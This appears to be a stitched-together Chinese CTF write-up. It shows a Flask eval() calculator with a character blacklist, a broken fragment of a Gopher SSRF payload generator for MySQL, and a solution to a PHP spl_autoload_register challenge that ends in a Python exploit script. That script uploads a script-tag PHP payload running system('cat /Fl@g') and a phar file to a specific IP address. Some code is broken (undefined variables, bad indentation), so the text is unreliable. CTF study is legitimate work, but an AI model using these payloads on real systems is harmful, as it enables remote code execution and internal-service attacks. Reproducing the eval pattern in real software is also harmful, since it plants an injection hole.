```python
import flask
from flask import Flask, request, session
import re

app = Flask(__name__)
def waf(s):
	try:
	blacklist='''abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ=_\t\n\\[]'"@'''
		for i in blacklist:
			if i in s:
				return 'error'
		return s
	except:
		return 'error'

@app.route('/', methods=['GET', 'POST'])
def index():
	if request.method == 'GET':
		return flask.render_template('index.html')
	elif request.method == 'POST':
		calc = waf(request.form.get("calc"))
		if calc !='error':

			calc = eval(calc)
		return flask.render_template('index.html',calc=calc)


if __name__ == '__main__':
	app.debug = False
	app.run('0.0.0.0', 80)
```

def MySQL_Exp(db_host,db_user,db_query):
    encode_user = db_user.encode("hex")
    user_length = len(db_user)
    temp = user_length - 4
    length = (chr(0xa3+temp)).encode("hex")

    dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c"
    auth = dump.replace("\n","")

    def encode(s):
        a = [s[i:i + 2] for i in range(0, len(s), 2)]
        return "gopher://" + db_host + "/_%" + "%".join(a)

    def get_payload(query):
        if(query.strip()!=''):
            query = query.encode("hex")
            query_length = '{:06x}'.format((int((len(query) / 2) + 1)))
            query_length = query_length.decode('hex')[::-1].encode('hex')
            pay1 = query_length + "0003" + query
            final = encode(auth + pay1 + "0100000001")
            return final
        else:
            return encode(auth)


    print "\033[93m" +"\n[+] Your Gopher Link Is Ready To Do SSRF: \n" + "\033[0m"
    print "\033[04m" + get_payload(db_query)+ "\033[0m" + '\n'

if __name__ == "__main__":
    launcher()

## SPL

```php
<?php
session_start();
highlight_file(__FILE__);
error_reporting(0);
$upload = 'upload/'.md5("ctf".$_SERVER['REMOTE_ADDR']);
mkdir($upload);
chdir($upload);
file_put_contents('/index.php', '');

spl_autoload_register($_GET['func']);
if (isset($_GET['file']) && !preg_match('/ph(p|t)|htaccess|user/is', $_GET['file']) && !preg_match('/<\?/is', $_GET['data'])){
    file_put_contents($_GET['file'], $_GET['data']);
}
```

主要看`spl_autoload_register`

> **spl_autoload_register**
>
> ```php
> 
> <?php
> spl_autoload_register("system");
> new ls();
> ```
>
> 在`new ls()`时，如果没有找到`ls`类，会将`system`作为函数，`ls`作为参数来执行
>
> ```php
> <?php
> spl_autoload_register();
> new abc();
> ```
>
> 在`new abc()时`，如果没有找到`abc`类，会包含`abc.inc`
>
> 而这个函数实际上调用的是`spl_autoload`，所以包含文件时要使用该函数

接下来就是想办法绕过**waf**，主要就是对**data**的waf`<?`

这里可以用php5的标签来绕过

`<script language="php">system("cat /Fl@g");</script>`

但是环境应该是**php7**的，属于是非预期了

**exp**

先生成phar，frank爹的phpphar不会用啊😭

```php
<?php
class xl{}
if(is_file('phar.phar')) {
    unlink('phar.phar');
}
$main = new xl();
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setMetadata($main);
$phar->addFromString("foo.txt", "test");
$phar->stopBuffering();
```

首先传一个**xl.inc**，文件内容就是上面的标签php，然后传一个上述php代码生成的phar文件，这时候利用**phar://**协议包含该phar文件就行

```python
import requests
HOST = 'http://47.97.127.1:29722/'

params1 = {
'func':'',
'file':'xl.inc',
'data':'<script language="php">system("cat /Fl@g");</script>'
}

r = requests.get(HOST,params=params1)

params1 = {
'func':'',
'file':'/tmp/test.phar',
'data':open('./phar.phar','rb').read()
}

r = requests.get(HOST,params=params1)
#print(r.text)
params1 = {
'func':'spl_autoload',
'file':'phar:///tmp/test.phar',
'data':'aaad'
}
r = requests.get(HOST,params=params1)
print(r.text)
```
